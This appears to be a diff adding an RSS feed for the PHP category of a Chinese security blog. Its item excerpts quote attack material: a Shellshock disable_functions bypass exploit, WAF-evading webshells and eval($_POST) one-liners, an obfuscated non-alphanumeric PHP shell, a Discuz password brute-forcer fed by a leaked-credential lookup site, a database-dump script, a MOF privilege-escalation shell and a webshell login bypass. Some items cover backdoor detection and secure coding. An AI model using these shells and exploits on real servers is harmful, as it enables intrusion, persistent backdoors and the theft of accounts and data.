@@ -1,0 +1,462 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>PHP on Nuclear&#39;Atk（核攻击）网络安全实验室</title>
+    <link>https://lcx.cc/categories/php/</link>
+    <description>Recent content in PHP on Nuclear&#39;Atk（核攻击）网络安全实验室</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>Nuclear&#39;Atk（核攻击）网络安全实验室</copyright>
+    <lastBuildDate>Mon, 15 Jun 2015 15:54:26 +0800</lastBuildDate><atom:link href="https://lcx.cc/categories/php/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>过狗菜刀 asp php，简单绕过安全狗拦截的菜刀修改方法</title>
+      <link>https://lcx.cc/post/4540/</link>
+      <pubDate>Mon, 15 Jun 2015 15:54:26 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4540/</guid>
+      <description>过狗菜刀 asp php ′ 雨。 | 2015-06-13 12:38 高考结束了, 考得反正不咋样。 趁分数还没出来,就先happy 一下。 无聊翻电脑翻到了一年以前自己做的一把过狗菜刀, 测试了</description>
+    </item>
+    
+    <item>
+      <title>【HELP】Thinkphp识别/指纹/搜集</title>
+      <link>https://lcx.cc/post/4463/</link>
+      <pubDate>Sun, 21 Dec 2014 12:03:30 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4463/</guid>
+      <description>【HELP】Thinkphp识别/指纹/搜集 phith0n (我也不会难过 你不要小看我) | 2014-12-19 01:03 近来创业虽然辛苦，但在写创业项目代码的时候还能发现几个0da</description>
+    </item>
+    
+    <item>
+      <title>PHP Execute Command Bypass Disable_functions</title>
+      <link>https://lcx.cc/post/4449/</link>
+      <pubDate>Wed, 19 Nov 2014 00:29:39 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4449/</guid>
+      <description>PHP Execute Command Bypass Disable_functions phith0n (我也不会难过 你不要小看我) | 2014-11-18 14:09 先简单说一下php调用mail()函数的过程。 看到源码ext/mail.c 236行： char *sendmail_path = INI_STR(&#34;sendmail_path&#34;); char</description>
+    </item>
+    
+    <item>
+      <title>PHP 5.x - Bypass Disable Functions (via Shellshock)</title>
+      <link>https://lcx.cc/post/4448/</link>
+      <pubDate>Wed, 19 Nov 2014 00:25:41 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4448/</guid>
+      <description># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) # Google Dork: none # Date: 10/31/2014 # Exploit Author: Ryan King (Starfall) # Vendor Homepage: http://php.net # Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror # Version: 5.* (tested on 5.6.2) # Tested on: Debian 7 and CentOS 5 and 6 # CVE: CVE-2014-6271 &amp;lt;?php function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283 if(strstr(readlink(&#34;/bin/sh&#34;), &#34;bash&#34;) != FALSE) { $tmp = tempnam(&#34;.&#34;,&#34;data&#34;); putenv(&#34;PHP_LOL=()</description>
+    </item>
+    
+    <item>
+      <title>php绕过安全狗检测的小马分享</title>
+      <link>https://lcx.cc/post/4423/</link>
+      <pubDate>Sat, 30 Aug 2014 09:44:39 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4423/</guid>
+      <description>php绕过安全狗检测的小马分享 zph | 2014-08-28 15:10 直接上代码： &amp;lt;?php $p=realpath(dirname(__FILE__).&#34;/../&#34;).$_POST[&#34;a&#34;]; $t=$_POST[&#34;b&#34;]; $tt=&#34;&#34;; for ($i=0;$i&amp;lt;strlen($t);$i+=2) $tt.=urldecode(&#34;%&#34;.substr($t,$i,2)); @fwrite(fopen($p,&#34;w&#34;),$tt); echo &#34;success!&#34;; ?&amp;gt; 分析利用&amp;amp;过狗： &amp;lt;?php $p=realpath(dirname(__FILE__).&#34;/../&#34;).$_POST[&#34;a&#34;]; //定义$p为根目录的物理路径+$_PO</description>
+    </item>
+    
+    <item>
+      <title>PHP中使用按位取反(~)函数创建后门，编码变异类后门！免杀绕过防火墙</title>
+      <link>https://lcx.cc/post/4419/</link>
+      <pubDate>Sat, 23 Aug 2014 11:12:44 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4419/</guid>
+      <description>.::PHP中使用按位取反(~)函数创建后门::. We enjoy hacking of life in day and night. _______________________________________________ [+] Author: Evi1m0 &amp;lt;evi1m0.bat#gmail.com&amp;gt; [+] Team: FF0000 TEAM &amp;lt;http://www.ff0000.cc&amp;gt; [+] From: HackerSoul &amp;lt;http://www.hackersoul.com&amp;gt; [+] Create: 2014-02-04 _______________________________________________ -= Main =- 1）PHP ~位运算符 前一段时间</description>
+    </item>
+    
+    <item>
+      <title>C99.PHP webshell 绕过登陆密码漏洞</title>
+      <link>https://lcx.cc/post/4381/</link>
+      <pubDate>Wed, 25 Jun 2014 16:07:30 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4381/</guid>
+      <description>From: Every C99.php Shell Is Backdoored (A.K.A. Free Shells for Everyone!) C99.php存在一个漏洞可以绕过登陆密码直接登陆的漏洞。 http://127.0.0.1/c99.php?c99shcook[login]=0 可直接登陆。 @extract($_REQUEST[&#34;c99shcook&#34;]); 变量覆盖 if ($login) { if (empty($md5_pass)) { $md5_pass = md5($pass); } if (($_SERVER[&#34;PHP_AUTH_USER&#34;] != $login) or (md5($_SERVER[&#34;PHP_AUTH_PW&#34;]) != $md5_pass))</description>
+    </item>
+    
+    <item>
+      <title>同一个web目录，已存在旧的php文件可以执行，新增加的php文件显示403？</title>
+      <link>https://lcx.cc/post/4365/</link>
+      <pubDate>Mon, 09 Jun 2014 10:53:59 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4365/</guid>
+      <description>同一个web目录，已存在旧的php文件可以执行，新增加的php文件显示403 这是什么情况？ Sct7p | 2014-06-06 01:02 碰到一变态站点，linux下的nginx 在</description>
+    </item>
+    
+    <item>
+      <title>windows下php不支持pgsql的解决方法</title>
+      <link>https://lcx.cc/post/4362/</link>
+      <pubDate>Wed, 04 Jun 2014 11:18:03 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4362/</guid>
+      <description>最近在倒腾pgsql，因此需要本地安装一个pgsql。 本地是安装好了，但是phpinfo下却没有pgsql的信息，怎么办呢，折腾良久，决定上</description>
+    </item>
+    
+    <item>
+      <title>Discuz 爆破无视验证码，PHP 调用社工库暴破 Discuz 论坛账户脚本</title>
+      <link>https://lcx.cc/post/4359/</link>
+      <pubDate>Mon, 02 Jun 2014 14:30:27 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4359/</guid>
+      <description>&amp;lt;?php class fuckdz{ public function sgk($user){ $a=file_get_contents(&#34;http://www.soyun.org/cha_api.php?so=$user&amp;amp;auto=&#34;); $a=iconv(&#34;UTF-8&#34;, &#34;GB2312//IGNORE&#34;, $a); preg_match_all(&#34;/7%\&#34;&amp;gt;(.*)&amp;lt;/isU&#34;,$a,$arr); unset($arr[0]); foreach ($arr as $key=&amp;gt;$r){ return $r; } } public function getuid($host,$uid){ $a=file_get_contents(&#34;$host/home.php?mod=space&amp;amp;do=profile&amp;amp;from=space&amp;amp;&amp;amp;uid=$uid&#34;); if(!strpos($a,&#34;charset=gbk&#34;)){ $a=iconv(&#34;UTF-8&#34;, &#34;GB2312//IGNORE&#34;, $a); } preg_match(&#34;/&amp;lt;title&amp;gt;(.*)的/isU&#34;,$a,$</description>
+    </item>
+    
+    <item>
+      <title>一个PHP爆路径方法，PHP数组溢出暴网站绝对路径</title>
+      <link>https://lcx.cc/post/4355/</link>
+      <pubDate>Sat, 31 May 2014 10:41:50 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4355/</guid>
+      <description>蛋疼的我又YY了一下一种爆路径 寂寞的瘦子 (LISP异教徒) | 2014-05-30 20:20 本次采用耗尽内存的方法，溢出爆路径。。 有些代码为了处理某些数据会这样处理，应</description>
+    </item>
+    
+    <item>
+      <title>分享一个爆PHP路径的方法，PHP暴露网站绝对路径的方法</title>
+      <link>https://lcx.cc/post/4351/</link>
+      <pubDate>Fri, 30 May 2014 10:22:30 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4351/</guid>
+      <description>分享一个爆PHP路径的方法 寂寞的瘦子 (LISP异教徒) | 2014-05-30 00:02 看到很多人都在求爆php网站路径，今天无意中看到了一个php.ini选项，一联想</description>
+    </item>
+    
+    <item>
+      <title>php wget 脱裤脚本，拖数据库脚本</title>
+      <link>https://lcx.cc/post/4337/</link>
+      <pubDate>Wed, 21 May 2014 11:11:37 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4337/</guid>
+      <description>在t00ls看到lcx牛分享了一个asp wget脱裤脚本。 于是拿php写了一个mysql wget版本。 &amp;lt;?php //author: By Gavin //Usage: wget &#34;http://xxx.com/wget_sql.php?sn=0&amp;amp;en=5000000&amp;amp;ln=50000&#34; -O gavin.sql error_reporting(0); ignore_user_abort(); set_time_limit(0); ob_clean(); //配置数据</description>
+    </item>
+    
+    <item>
+      <title>如何查找php木马后门高级篇</title>
+      <link>https://lcx.cc/post/4335/</link>
+      <pubDate>Tue, 20 May 2014 13:34:14 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4335/</guid>
+      <description>如何查找php木马后门高级篇 jusker (爱好后门后门分析) | 2014-05-17 11:54 &amp;lt;?php eval($_POST[xiao])?&amp;gt; # 在正常的编程中eval不常见，可通过字符串匹配查找eval 常见的是变成 base64_decode(PD9waHAgZXZhbCgkX1BPU1RbeGlhb10pPz4=) #同样</description>
+    </item>
+    
+    <item>
+      <title>快速查找php后门初级篇</title>
+      <link>https://lcx.cc/post/4331/</link>
+      <pubDate>Mon, 19 May 2014 09:17:59 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4331/</guid>
+      <description>首先这是php后门这是毫无质疑的 如下同样是 都是这样的 首先了解下linux的grep命令 linux grep命令 1.作用 Linux系统中grep命令是一</description>
+    </item>
+    
+    <item>
+      <title>采集指定域名邮箱用于社工或者fuzz的PHP小脚本</title>
+      <link>https://lcx.cc/post/4309/</link>
+      <pubDate>Mon, 05 May 2014 09:32:58 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4309/</guid>
+      <description>只写了百度的规则,GOOGLE抓取搜索地址后自己写。我的思路是禁止javascript来得到返回的内容。 配合生成弱口令的小脚本进行爆破效果应</description>
+    </item>
+    
+    <item>
+      <title>PHP的strcmp函数引发的安全问题</title>
+      <link>https://lcx.cc/post/4244/</link>
+      <pubDate>Fri, 14 Mar 2014 10:30:19 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4244/</guid>
+      <description>在官方的文档有这么一端说明： Note a difference between 5.2 and 5.3 versions echo (int)strcmp(&#39;pending&#39;,array()); will output -1 in PHP 5.2.16 (probably in all versions prior 5.3) but will output 0 in PHP 5.3.3 Of course, you never need to use array as a parameter in string comparisions. 大概意思就是5.3的之前和</description>
+    </item>
+    
+    <item>
+      <title>当PHP一句话遇到exit()，看我如何把渣渣转化为鸡肋</title>
+      <link>https://lcx.cc/post/4222/</link>
+      <pubDate>Thu, 27 Feb 2014 17:15:32 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4222/</guid>
+      <description>当PHP一句话遇到exit（），看我如何把渣渣转化为鸡肋。 寂寞的瘦子 (’) | 2014-02-24 22:43 在研究某套源码时发现的原来在极端恶劣的情况还是可以提取出一点</description>
+    </item>
+    
+    <item>
+      <title>PHP漏洞挖掘思路&#43;实例</title>
+      <link>https://lcx.cc/post/4174/</link>
+      <pubDate>Wed, 15 Jan 2014 11:27:24 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4174/</guid>
+      <description>最近研究PHP漏洞的挖掘，总结了一些我挖到的漏洞，整理了一下思路，求各路神人补充、批评、指导~ 本文所有示例均来自我在乌云上已由厂商允许公开的</description>
+    </item>
+    
+    <item>
+      <title>mof提权带回显带清楚命令版本.php</title>
+      <link>https://lcx.cc/post/4048/</link>
+      <pubDate>Tue, 26 Nov 2013 09:58:00 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/4048/</guid>
+      <description>&amp;lt;?php $path=&#34;c:/windows/system32/canimei&#34;; session_start(); if(!empty($_POST[&#39;submit&#39;])){ setcookie(&#34;connect&#34;); setcookie(&#34;connect[host]&#34;,$_POST[&#39;host&#39;]); setcookie(&#34;connect[user]&#34;,$_POST[&#39;user&#39;]); setcookie(&#34;connect[pass]&#34;,$_POST[&#39;pass&#39;]); setcookie(&#34;connect[dbname]&#34;,$_POST[&#39;dbname&#39;]); echo &#34;&amp;lt;script&amp;gt;location.href=&#39;?action=connect&#39;&amp;lt;/script&amp;gt;&#34;; } if(empty($_GET[&#34;action&#34;])){ ?&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt;&amp;lt;title&amp;gt;Win MOF Shell&amp;lt;/title&amp;gt;&amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form action=&#34;?action=connect&#34; method=&#34;post&#34;&amp;gt; Host: &amp;lt;input type=&#34;text&#34; name=&#34;host&#34; value=&#34;192.168.200.144:3306&#34;&amp;gt;&amp;lt;br/&amp;gt; User: &amp;lt;input type=&#34;text&#34; name=&#34;user&#34; value=&#34;root&#34;&amp;gt;&amp;lt;br/&amp;gt; Pass: &amp;lt;input type=&#34;password&#34; name=&#34;pass&#34; value=&#34;toor&#34;&amp;gt;&amp;lt;br/&amp;gt; DB: &amp;lt;input type=&#34;text&#34; name=&#34;dbname&#34; value=&#34;mysql&#34;&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;input type=&#34;submit&#34; name=&#34;submit&#34; value=&#34;Submit&#34;&amp;gt;&amp;lt;br/&amp;gt; &amp;lt;/form&amp;gt; &amp;lt;/body&amp;gt; &amp;lt;/html&amp;gt; &amp;lt;?php exit; } if ($_GET[action]==&#39;connect&#39;) { $conn=mysql_connect($_COOKIE[&#34;connect&#34;][&#34;host&#34;],$_COOKIE[&#34;connect&#34;][&#34;user&#34;],$_COOKIE[&#34;connect&#34;][&#34;pass&#34;]) or die(&#39;&amp;lt;pre&amp;gt;&#39;.mysql_error().&#39;&amp;lt;/pre&amp;gt;&#39;); echo &#34;&amp;lt;form action=&#39;&#39; method=&#39;post&#39;&amp;gt;&#34;; echo &#34;Cmd:&#34;; echo &#34;&amp;lt;input type=&#39;text&#39; name=&#39;cmd&#39; value=&#39;$strCmd&#39;?&amp;gt;&#34;; echo</description>
+    </item>
+    
+    <item>
+      <title>绕过网站安全狗3.1 上传 *.php. 文件</title>
+      <link>https://lcx.cc/post/3994/</link>
+      <pubDate>Fri, 08 Nov 2013 09:15:50 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3994/</guid>
+      <description>绕过网站安全狗3.1 上传 90_ | 2013-11-07 22:37 首发自 08安全团队（www.08sec.com） 此方法只试用于V3.1 05837 或小于V3.1 05837 最新版本为 V3.1 06103 ps：</description>
+    </item>
+    
+    <item>
+      <title>Apache / PHP 5.x Remote Code Execution Exploit</title>
+      <link>https://lcx.cc/post/3987/</link>
+      <pubDate>Mon, 04 Nov 2013 14:44:05 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3987/</guid>
+      <description>/* Apache Magica by Kingcope */ /* gcc apache-magika.c -o apache-magika -lssl */ /* This is a code execution bug in the combination of Apache and PHP. On Debian and Ubuntu the vulnerability is present in the default install of the php5-cgi package. When the php5-cgi package is installed on Debian and Ubuntu or php-cgi is installed manually the php-cgi binary is accessible under /cgi-bin/php5 and /cgi-bin/php. The vulnerability makes</description>
+    </item>
+    
+    <item>
+      <title>完美扫描PHP特殊一句话后门</title>
+      <link>https://lcx.cc/post/3976/</link>
+      <pubDate>Fri, 01 Nov 2013 08:40:11 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3976/</guid>
+      <description>&amp;lt;?php /********************** 作者 Spider 网上公布的各种PHP后门全军覆没 针对一些特殊变形的后门需要自己添加特征 误报率不到百分之一 **********************/ error_reporting(E_ERROR); ini_set(&#39;max_execution_time&#39;,20000); ini_set(&#39;memory_limit&#39;,&#39;512M&#39;); header(&#34;content-Type: text/html; charset=gb2312&#34;); $matches = array( &#39;/function\_exists\s*\(\s*[\&#39;|\&#34;](popen|exec|proc\_open|system|passthru)+[\&#39;|\&#34;]\s*\)/i&#39;, &#39;/(exec|shell\_exec|system|passthru)+\s*\(\s*\$\_(\w+)\[(.*)\]\s*\)/i&#39;, &#39;/((udp|tcp)\:\/\/(.*)\;)+/i&#39;, &#39;/preg\_replace\s*\((.*)\/e(.*)\,\s*\$\_(.*)\,(.*)\)/i&#39;, &#39;/preg\_replace\s*\((.*)\(base64\_decode\(\$/i&#39;, &#39;/(eval|assert|include|require|include\_once|require\_once)+\s*\(\s*(base64\_decode|str\_rot13|gz(\w+)|file\_(\w+)\_contents|(.*)php\:\/\/input)+/i&#39;, &#39;/(eval|assert|include|require|include\_once|require\_once|array\_map|array\_walk)+\s*\(\s*\$\_(GET|POST|REQUEST|COOKIE|SERVER|SESSION)+\[(.*)\]\s*\)/i&#39;, &#39;/eval\s*\(\s*\(\s*\$\$(\w+)/i&#39;, &#39;/(include|require|include\_once|require\_once)+\s*\(\s*[\&#39;|\&#34;](\w+)\.(jpg|gif|ico|bmp|png|txt|zip|rar|htm|css|js)+[\&#39;|\&#34;]\s*\)/i&#39;, &#39;/\$\_(\w+)(.*)(eval|assert|include|require|include\_once|require\_once)+\s*\(\s*\$(\w+)\s*\)/i&#39;, &#39;/\(\s*\$\_FILES\[(.*)\]\[(.*)\]\s*\,\s*\$\_(GET|POST|REQUEST|FILES)+\[(.*)\]\[(.*)\]\s*\)/i&#39;,</description>
+    </item>
+    
+    <item>
+      <title>jsp能像php asp什么的include后门文件吗？</title>
+      <link>https://lcx.cc/post/3971/</link>
+      <pubDate>Tue, 29 Oct 2013 09:53:56 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3971/</guid>
+      <description>jsp能像php asp什么的include后门文件吗？ 不可以吧，jsp只能include jsp文件吧？要不怎么没看见有人说过jsp inclu</description>
+    </item>
+    
+    <item>
+      <title>逆向追踪之：通过QQ群里的图片逆向入侵，拿了几个phpddos的脚本</title>
+      <link>https://lcx.cc/post/3961/</link>
+      <pubDate>Mon, 21 Oct 2013 10:08:11 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3961/</guid>
+      <description>无聊拿了几个phpddos的脚本 破落日 | 2013-10-20 00:10 起初是在群里看到这张图 看到这么多shell不明觉厉啊 谷歌了一下,发现这个 看样子应该是前段时间批量</description>
+    </item>
+    
+    <item>
+      <title>php4fun.sinaapp.com PHP挑战通关攻略</title>
+      <link>https://lcx.cc/post/3958/</link>
+      <pubDate>Fri, 18 Oct 2013 09:21:23 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3958/</guid>
+      <description>challenge 1 php code： #GOAL: get password from admin; error_reporting(0); require &#39;db.inc.php&#39;; function clean($str){ if(get_magic_quotes_gpc()){ $str=stripslashes($str); } return htmlentities($str, ENT_QUOTES); } $username = @clean((string)$_GET[&#39;username&#39;]); $password = @clean((string)$_GET[&#39;password&#39;]); $query=&#39;SELECT * FROM users WHERE name=\&#39;&#39;.$username.&#39;\&#39; AND pass=\&#39;&#39;.$password.&#39;\&#39;;&#39;; $result=mysql_query($query); if(!$result || mysql_num_rows($result) &amp;lt; 1){ die(&#39;Invalid password!&#39;); } $row = mysql_fetch_assoc($result); echo &#34;Hello &#34;.$row[&#39;name&#39;].&#34;&amp;lt;/br&amp;gt;&#34;; echo &#34;Your password is:&#34;.$row[&#39;pass&#39;].&#34;&amp;lt;/br&amp;gt;&#34;; 攻略： 在单引号内的mys</description>
+    </item>
+    
+    <item>
+      <title>我使用的PHP一句话的姿态</title>
+      <link>https://lcx.cc/post/3953/</link>
+      <pubDate>Wed, 16 Oct 2013 09:30:04 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3953/</guid>
+      <description>其实已经不是一句话了，好几句了都。 继续上次的：我使用的一句话的几种姿态 这回研究了下PHP，发一下我使用的一句话（可过文件扫描）。 &amp;lt;?php $mujj = $_POST[&#39;z&#39;]; if ($mujj!=&#34;&#34;)</description>
+    </item>
+    
+    <item>
+      <title>PHP 无文件后门，驻留在内存中在后台循环执行命令，“不死幽灵”后门</title>
+      <link>https://lcx.cc/post/3933/</link>
+      <pubDate>Tue, 08 Oct 2013 10:47:02 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3933/</guid>
+      <description>PHP 无文件后门的意思是驻在 php 后台中的 shell。驻留在内存中在后台循环执行命令，可以删掉文件，关掉浏览器，只要服务器进程不重启，可以一直在运行</description>
+    </item>
+    
+    <item>
+      <title>PHP非字母数字の代码</title>
+      <link>https://lcx.cc/post/3890/</link>
+      <pubDate>Wed, 18 Sep 2013 09:29:24 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3890/</guid>
+      <description>From:http://insert-script.blogspot.com/2012/12/php-non-alpha-numeric-76-chars.html 如果你对PHP中非字母和数字的字符并不了解，请猛击后面的教程:Tutorial. 上面那个教程看这段代码就知道是如何在$_变量中凑齐想要的字</description>
+    </item>
+    
+    <item>
+      <title>DVWA中学习PHP常见漏洞及修复方法</title>
+      <link>https://lcx.cc/post/3883/</link>
+      <pubDate>Tue, 17 Sep 2013 15:20:47 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3883/</guid>
+      <description>“安全是一个整体，保证安全不在于强大的地方有多强大 而在于真正薄弱的地方在哪里”--剑心 从很多的渗透大型企业内网的案例来看，入侵者大多数是从W</description>
+    </item>
+    
+    <item>
+      <title>WordPress &lt; 3.6.1 PHP 对象注入漏洞</title>
+      <link>https://lcx.cc/post/3877/</link>
+      <pubDate>Mon, 16 Sep 2013 10:35:19 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3877/</guid>
+      <description>From:WordPress &amp;lt; 3.6.1 PHP Object Injection 0x00 背景 当我读到一篇关于Joomla的“PHP对象注射”的漏洞blog后，我挖深了一点就发现Stefan Esser大神在2010年</description>
+    </item>
+    
+    <item>
+      <title>php反序列unserialize的一个小特性</title>
+      <link>https://lcx.cc/post/3875/</link>
+      <pubDate>Mon, 16 Sep 2013 09:18:47 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3875/</guid>
+      <description>这几天wordpress的那个反序列漏洞比较火，具体漏洞我就不做分析了，看这篇：http://drops.wooyun.org/papers</description>
+    </item>
+    
+    <item>
+      <title>php图片留后门又一思路</title>
+      <link>https://lcx.cc/post/3766/</link>
+      <pubDate>Sat, 27 Jul 2013 09:27:42 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3766/</guid>
+      <description>php图片留后门又一思路 _Evil (年轻人切忌浮躁,性趣是最好的导师.) | 2013-07-27 00:29 最近懒得要死,每晚去美服lol了...... 今天一看Wooyun就看到</description>
+    </item>
+    
+    <item>
+      <title>突破php的imagecopyresampled和imagecopyresized实现图片马JPG</title>
+      <link>https://lcx.cc/post/3764/</link>
+      <pubDate>Sat, 27 Jul 2013 08:51:30 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3764/</guid>
+      <description>突破php 的imagecopyresampled 和imagecopyresized 实现图片马 JPG livers (如梦似幻) | 2013-07-26 15:07 之前有人发布了 利用PNG 图</description>
+    </item>
+    
+    <item>
+      <title>发现一个phpmyadmin,给过滤&#39;导不出shell 求方法</title>
+      <link>https://lcx.cc/post/3756/</link>
+      <pubDate>Wed, 24 Jul 2013 09:17:25 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3756/</guid>
+      <description>发现一个phpmyadmin,给过滤&#39;导不出shell 求方法 三十度 | 2013-07-23 20:41 今天碰到个phpmyadmin 发现只要执行 Insert INTO a (cmd) VALUES(&#39;&amp;lt;?php @eval($_POST[cmd])?&amp;gt;&#39;); 或 select cmd from a into outfile</description>
+    </item>
+    
+    <item>
+      <title>PHP安全编码</title>
+      <link>https://lcx.cc/post/3580/</link>
+      <pubDate>Mon, 17 Jun 2013 16:07:33 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3580/</guid>
+      <description>2013/06/03 18:56 | 瞌睡龙 验证过滤用户的输入 即使是最普通的字母数字输入也可能是危险的，列举几个容易引起安全问题的字符： ! $ ^ &amp;amp; * ( ) ~ [ ] \ | { } &#39; &#34; ; &amp;lt;</description>
+    </item>
+    
+    <item>
+      <title>Tweetable PHP-Non Alpha</title>
+      <link>https://lcx.cc/post/3534/</link>
+      <pubDate>Tue, 28 May 2013 10:29:32 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3534/</guid>
+      <description>Tweetable PHP-Non Alpha Thursday, 13 December 2012 I started to try and break the 10 charset limit of PHP non-alpha after @InsertScript showed me that PHP Dev supports [] syntax for arrays. I wondered if it would be possible to break the limit within production PHP. At first I thought you could but then after some testing I found that there was no way to concat without “.”</description>
+    </item>
+    
+    <item>
+      <title>一个另类的 PHP 加密算法</title>
+      <link>https://lcx.cc/post/3533/</link>
+      <pubDate>Tue, 28 May 2013 10:22:38 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3533/</guid>
+      <description>这种php的数据表示方法是国外几个大牛提出来的。 Tweetable PHP-Non Alpha 蛋疼了研究了下，写出了个微型shell &amp;lt;?php $_[]++;$_[]=$_._;$_=$_[$_[+_]];$_=$__=$___=$____=$_____=$______=$_[+_]; $_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++; $__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; $___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++;$___++; $____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++;$____++; $_____++;$_____++;$_____++;$_____++; $______++;$______++;$______++;$______++;$______++;$______++;$______++;$______++;$______++;$______++;$______++;$______++; $_=$_.$__.$___.$____.$_____.$______;$_(&#34;ipconfig&#34;); ?&amp;gt; 简单说明下 $_[]++; $_[]=$_._; $_=$_[$_[+_]]; $_=$_[+_]; //使用数</description>
+    </item>
+    
+    <item>
+      <title>php图片木马绕过图片缩放、压缩、二次转码等“破坏性”过滤</title>
+      <link>https://lcx.cc/post/3518/</link>
+      <pubDate>Wed, 22 May 2013 17:15:47 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3518/</guid>
+      <description>关于上传解析的问题 求思路 Demon (证道) | 2013-05-22 15:38 发现某站上传图片后任意后缀都能执行，于是把一句话插入到图片里，可是上传后图片被重新压缩了一遍，导致图</description>
+    </item>
+    
+    <item>
+      <title>那些强悍的PHP一句话后门</title>
+      <link>https://lcx.cc/post/3511/</link>
+      <pubDate>Mon, 20 May 2013 16:23:34 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3511/</guid>
+      <description>亦家从建立起就有一个很重要的服务项目 – 安全监测，而上线后很少有相关的佐证内容，那从今天开始也就开始了这一部分的分享与撰写。我们以一个学习的心</description>
+    </item>
+    
+    <item>
+      <title>php mysql 4 数字型注入，技巧讨论</title>
+      <link>https://lcx.cc/post/3496/</link>
+      <pubDate>Tue, 14 May 2013 09:03:59 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3496/</guid>
+      <description>php mysql 4 数字型注入 遇到了巨大困难。。。 lxj616 | 2013-05-13 22:08 一个注入点，求大神指导 cast(database() as char) 回显：tempdb version()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 回显：4.0.26-nt user()&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 回显：root@loc</description>
+    </item>
+    
+    <item>
+      <title>phpMyAdmin 3.5.8 and 4.0.0-RC2 - Multiple Vulnerabilities</title>
+      <link>https://lcx.cc/post/3448/</link>
+      <pubDate>Sat, 27 Apr 2013 08:35:18 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3448/</guid>
+      <description>[waraxe-2013-SA#103] - Multiple Vulnerabilities in phpMyAdmin =============================================================================== Author: Janek Vind &#34;waraxe&#34; Date: 25. April 2013 Location: Estonia, Tartu Web: http://www.waraxe.us/advisory-103.html Description of vulnerable software: ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ phpMyAdmin is a free software tool written in PHP, intended to handle the administration of MySQL over the World Wide Web. phpMyAdmin supports a wide range of operations with MySQL. http://www.phpmyadmin.net/home_page/index.php ############################################################################### 1. Remote code execution via preg_replace() in &#34;libraries/mult_submits.inc.php&#34; ############################################################################### Reason: 1. insufficient sanitization</description>
+    </item>
+    
+    <item>
+      <title>易想团购ajax.php SQL注入分析和Exp</title>
+      <link>https://lcx.cc/post/3431/</link>
+      <pubDate>Thu, 18 Apr 2013 11:13:06 +0800</pubDate>
+      
+      <guid>https://lcx.cc/post/3431/</guid>
